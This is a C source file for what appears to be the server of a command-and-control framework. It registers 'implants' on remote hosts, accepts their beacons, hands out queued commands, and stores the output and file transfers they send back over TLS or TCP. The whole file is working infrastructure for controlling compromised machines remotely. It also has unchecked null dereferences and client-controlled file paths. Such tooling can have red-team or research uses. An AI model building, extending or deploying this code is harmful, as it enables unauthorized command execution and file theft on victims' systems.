#include "implant_handler.h"

#include <openssl/err.h>
#include <openssl/ssl.h>
#include <cjson/cJSON.h>
#include <fcntl.h>

#include "logs.h"
#include "db.h"
#include "common.h"

void GenerateID(const char *input, char output[9]) {
    unsigned char hash1[SHA256_DIGEST_LENGTH];
    char sha256_string[65];
    SHA256((unsigned char *)input, strlen(input), hash1);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(sha256_string + (i * 2), "%02x", hash1[i]);
    }
    sha256_string[64] = 0;

    uint8_t hash[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char *)sha256_string, strlen(sha256_string), hash);

    // Use first 6 bytes of hash (48 bits)
    uint64_t val = 0;
    for (int i = 0; i < 6; i++) {
        val = (val << 8) | hash[i];
    }
    // Convert to base62 (8 characters)
    for (int i = 7; i >= 0; i--) {
        output[i] = base62[val % 62];
        val /= 62;
    }
    output[8] = '\0';
}


char *register_implant(MYSQL* con, cJSON *json, char *ip) {

    cJSON *json_reply = cJSON_CreateObject();

    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    if (!hostname) {
        return NULL;
    }

    cJSON *os =  cJSON_GetObjectItem(json, "os");
    if (!os) {
        return NULL;
    }

    cJSON *arch = cJSON_GetObjectItem(json, "arch");
    if (!arch) {
        return NULL;
    }

    char input[255];
    snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
    char implant_id[65];
    GenerateID(input, implant_id);

    // check if id already exists in database
    if (check_implant_id(con, implant_id) == 1) goto REPLY;

    //log
    //log_new_agent(implant_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);
    log_message(LOG_INFO, "New Implant Registration (TCP): implant_id = %s, hostname = %s, os = %s, arch = %s", implant_id,  hostname->valuestring, os->valuestring, arch->valuestring);

    // register to datbase (implant_id, os, ip, mac, hostname)
    // check if agent id exists
    struct db_agents args;
    strncpy(args.implant_id, implant_id, sizeof(args.implant_id) - 1);
    args.implant_id[sizeof(args.implant_id) - 1] = '\0';
    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    args.os[sizeof(args.os) - 1] = '\0';
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.ip[sizeof(args.ip) - 1] = '\0';
    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    args.hostname[sizeof(args.hostname) - 1] = '\0';

    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    args.arch[sizeof(args.arch) - 1] = '\0';
    new_implant(con, args);

    // reply with agent id
    REPLY:
    
    cJSON_AddStringToObject(json_reply, "mode", "ack");
    cJSON_AddStringToObject(json_reply, "implant_id", implant_id);
    char *reply = cJSON_Print(json_reply);
    cJSON_Delete(json_reply);
    return reply;
}

char *beacon_implant(MYSQL* con, cJSON *json) {
    cJSON *implant_id = cJSON_GetObjectItem(json, "implant_id");
    cJSON *json_reply = cJSON_CreateObject();
    if (!implant_id) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        cJSON_Delete(json_reply);
        return reply;
    }
    // log
    
    // update last seen
    update_last_seen(con, implant_id->valuestring);
    // validate if agent id exists in the database.
    
    
    if (check_implant_id(con, implant_id->valuestring) == 0) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        cJSON_Delete(json_reply);

        log_message(LOG_INFO, "Beacon ID %s does not exists", implant_id->valuestring);
        return reply;
    }

    log_message(LOG_INFO, "Beacon from %s", implant_id->valuestring);

    // check if there are tasks queue for agent
    // change this so that it stores all qeues in a data structure to optimize 
    int task_id = check_tasks_queue(con, implant_id->valuestring);
    if (task_id == -1) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        cJSON_Delete(json_reply);
        return reply;
    } else {
        char *cmd =  get_task(con, task_id);
        if (cmd != NULL) {
            cJSON_AddStringToObject(json_reply, "command", cmd);
        } else {
            cJSON_AddStringToObject(json_reply, "command", "NULL");  // or "noop", or don't add it
        }
        cJSON_AddStringToObject(json_reply, "mode", "task");
        //cJSON_AddStringToObject(json_reply, "task_id", task_id);
        cJSON_AddNumberToObject(json_reply, "task_id", task_id);
        cJSON_AddStringToObject(json_reply, "implant_id", implant_id->valuestring);
        

        char *reply = cJSON_Print(json_reply);
        
        //if command = "upload [file path]" | upload file to agent 
        //if command = "download [file path]" | download file from agent
        //if (strncmp(cmd, "download", 8) ==0 || strncmp(cmd, "upload", 6) == 0) {
        //    char file[BUFFER_SIZE];
        //    char command[BUFFER_SIZE];
        //    if (sscanf(cmd, "%s %s", command, file) == 2) {
        //        if (strncmp(command, "download", 8) == 0) {
        //            download(file);
        //        } else {
        //            upload(file);
        //        }
        //    }
        //}
        free(cmd);
        cJSON_Delete(json_reply);
        return reply;
    }
}


void *implant_handler(void *args) {

    struct implant_handler_t *arg = (struct implant_handler_t*)args;
    

    MYSQL *con = get_db_connection();

    if (con == NULL) {
        log_message(LOG_ERROR, "Failed to get DB connection from pool");
        return NULL;
    }

    // Check if connection is still alive
    if (mysql_ping(con) != 0) {
        log_message(LOG_WARN, "DB connection lost, reconnecting...");
        return NULL;
    }

    if (arg->encrypted) {
        SSL_CTX *ctx  = arg->ctx;
        int client_fd = arg->client_fd;
    
        SSL *ssl = SSL_new(ctx);
        if (!ssl) {
            fprintf(stderr, "[!] SSL_new failed\n");
            close(client_fd);
            free(arg);
            return NULL;
        }
    
        if (SSL_set_fd(ssl, client_fd) != 1) {
            log_message(LOG_ERROR, "SSL_set_fd failed");
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }
    
        if (SSL_accept(ssl) != 1) {
            log_message(LOG_ERROR, "SSL_accept failed");
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }
    
        char buffer[BUFFER_SIZE];
        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (bytes_received <= 0) {
            log_message(LOG_ERROR, "SSL_read failed");
            ERR_print_errors_fp(stderr);
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }
        buffer[bytes_received] = '\0';

        cJSON *json = cJSON_Parse(buffer);
        if (!json) {
            //fprintf(stderr, "[!] Error parsing JSON\n");
            log_message(LOG_WARN, "Error parsing JSON (TCP [SSL] Handler)");
            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(client_fd);
            free(arg);
            return NULL;
        }

        cJSON *type = cJSON_GetObjectItem(json, "mode");
        if (!type) {
            log_message(LOG_WARN, "NO mode key in JSON");
        } else if (strcmp(type->valuestring, "register") == 0) {
            char *reply = register_implant(con, json, arg->ip);
            if (reply == NULL) return NULL;
            SSL_write(ssl, reply, strlen(reply));
            free(reply);
        } else if (strcmp(type->valuestring, "beacon") == 0) {
            char *reply = beacon_implant(con, json);
            SSL_write(ssl, reply, strlen(reply));
            cJSON *check_mode = cJSON_Parse(reply);
            free(reply);
            if (!check_mode) {
                log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
                goto CLEANUP;
            }
            cJSON *mode = cJSON_GetObjectItem(check_mode, "mode");
            if (strncmp(mode->valuestring, "none", 4) == 0) return NULL;

            cJSON *cmd = cJSON_GetObjectItem(check_mode, "command");
            if (strncmp(cmd->valuestring, "upload", 6) == 0) {
                implant_upload(ssl);
            } else if (strncmp(cmd->valuestring, "download", 8) == 0) {

            }

            char buffer[MAX_RESPONSE];
            int bytes_received = SSL_read(ssl, buffer, sizeof(buffer)-1);
            if (bytes_received <= 0) {
                log_message(LOG_ERROR, "Failed to receive data [SSL Beacon]");
                goto CLEANUP;
            }
            buffer[bytes_received] = '\0'; 
            cJSON *response = cJSON_Parse(buffer);
            if (!response) {
                log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
                goto CLEANUP;
            }
            cJSON *command_response = cJSON_GetObjectItem(response, "response");
            if (!command_response) {
                log_message(LOG_ERROR, "Invalid or missing key [response]" );
                cJSON_Delete(response);
                return NULL;
            }
            cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
            if (!task_id) {
                log_message(LOG_ERROR, "Invalid or missing key [task_id]" );
                cJSON_Delete(response);
                return NULL;
            }
            store_task_response(con, command_response->valuestring, task_id->valueint);
            cJSON_Delete(response);
        } 
        CLEANUP: 
        cJSON_Delete(json);
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_fd);
        free(arg);
        return NULL;
    } else {
        int sock = arg->client_fd;
        // recieves message from implant register or beaconing
        char buffer[BUFFER_SIZE];
        int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }
        buffer[bytes_received] = '\0';

        cJSON *json = cJSON_Parse(buffer);
        if (!json) {
            log_message(LOG_WARN, "Error Parsing JSON");
            return NULL;
        }

        cJSON *type = cJSON_GetObjectItem(json, "mode");
        if (strcmp(type->valuestring, "register") == 0) {
            char *reply = register_implant(con, json, arg->ip);
            send(sock, reply , strlen(reply), 0);
            free(reply);
        } else if (strcmp(type->valuestring, "beacon") == 0) {
            char *reply = beacon_implant(con, json);

            send(sock, reply, strlen(reply), 0);
            cJSON *check_mode = cJSON_Parse(reply);
            free(reply);
            if (!check_mode) {
                log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
                goto CLEANUP_2;
            }
            cJSON *mode = cJSON_GetObjectItem(check_mode, "mode");
            if (strncmp(mode->valuestring, "none", 4) == 0) return NULL;
            
            char buffer[MAX_RESPONSE];
            int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
            if (bytes_received <= 0) {
                perror("recv failed (beacon func)");
                goto CLEANUP_2;
            }
            buffer[bytes_received] = '\0'; 
        
            cJSON *response = cJSON_Parse(buffer);
            if (!response) {
                printf("Error parsing JSON!\n");
                goto CLEANUP_2;
            }
            cJSON *command_response = cJSON_GetObjectItem(response, "response");
            if (!command_response) {
                log_message(LOG_ERROR, "Invalid or missing key [response]" );
                cJSON_Delete(response);
                return NULL;
            }
            cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
            if (!task_id) {
                log_message(LOG_ERROR, "Invalid or missing key [task_id]" );
                cJSON_Delete(response);
                return NULL;
            }
            store_task_response(con, command_response->valuestring, task_id->valueint);
            cJSON_Delete(response);
            }

        //cJSON_Delete(json);
        CLEANUP_2:
        close(sock);
        free(args);
        return NULL;
    }
}


// send file to implant
int implant_upload(SSL *ssl) {
        // check if folder exists
        if (check_if_dir_exists("./uploads/implant/") == false) {
            if (create_dir("./uploads/implant") == false) {
                return -1;
            }
        }
        char filename[BUFFER_SIZE];
        SSL_read(ssl, filename, sizeof(filename) -1);
        cJSON *get_filename = cJSON_Parse(filename);
        if (!get_filename) {
            log_message(LOG_ERROR, "Failed to ");
            return -1;
        }
    
        cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
        //memset(filename, 0, sizeof(filename));
        strncpy(filename, name->valuestring, sizeof(filename)-1);
        log_message(LOG_INFO, "Receiving file with name : %s", filename);
        cJSON_Delete(get_filename);
    
        char *contents = (char*)malloc(MAX_INFO);
        char filepath[BUFFER_SIZE + 32]; // = "./uploads_operator";
        
        
        snprintf(filepath, sizeof(filepath), "./uploads/operator/%s", filename);
    
        int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (fd == -1) {
            log_message(LOG_ERROR, "Failed to create file descriptor for : %s", filepath);
            return -1;
        }
    
        log_message(LOG_INFO, "Writing to file : %s ", filepath);
        size_t bytesRead;
        size_t filesize;
        SSL_read(ssl, &filesize, sizeof(filesize));
    
        size_t received = 0;
        while (received < filesize) {
            bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
            write(fd, contents, bytesRead);
            received += bytesRead;
        }

        log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
        free(contents);
        return 0;
}


// send download file to imlant
int implant_download(SSL *ssl) {

    char filename[BUFFER_SIZE];
    SSL_read(ssl, filename, sizeof(filename) -1);
    cJSON *get_filename = cJSON_Parse(filename);
    if (!get_filename) {
        log_message(LOG_ERROR, "Failed to ");
        return -1;
    }
    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
    strncpy(filename, name->valuestring, sizeof(filename)-1);
    cJSON *dir = cJSON_GetObjectItem(get_filename, "dir");
    
    char base_path[BUFFER_SIZE];
    snprintf(base_path, BUFFER_SIZE, "./uploads/%s", dir->valuestring);

    char filepath[BUFFER_SIZE * 2];
    snprintf(filepath, sizeof(filepath), "%s/%s", base_path, filename);


    char *contents = (char*)malloc(MAX_INFO);
    if (contents == NULL) {
        log_message(LOG_ERROR, "[Upload File] failed to allocate memory");
        return -1;
    }

    int fd = open(filepath, O_RDONLY);
    if (fd == -1) {
        log_message(LOG_ERROR, "[Upload file] Failed to open file descriptor for : %s", filepath);
        return -1;
    }

    cJSON *dir_exists = cJSON_CreateObject();
    char *filepath_ = search_file(base_path, filename);
    if (filepath_ == NULL) {
        cJSON_AddBoolToObject(dir_exists, "Exist", false);
        char *exists = cJSON_Print(dir_exists);
        cJSON_Delete(dir_exists);
        SSL_write(ssl, exists, strlen(exists));
        free(exists);
        //log_message(LOG_ERROR, "File Does Not Exist filename - %s", filename);
        return -1;
    }
    cJSON_AddBoolToObject(dir_exists, "Exist", true);

    char *exists = cJSON_Print(dir_exists);
    cJSON_Delete(dir_exists);
    SSL_write(ssl, exists, strlen(exists));
    free(exists);
    
    log_message(LOG_INFO, "Uploading %s", filename);

    // send file size
    struct stat st;
    fstat(fd, &st);
    size_t filesize = st.st_size;
    SSL_write(ssl, &filesize, sizeof(filesize));
    size_t bytesRead;
    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
        SSL_write(ssl, contents, bytesRead);
    }
    
    log_message(LOG_INFO, "Upload Completed");
    free(contents);
    return 0;
}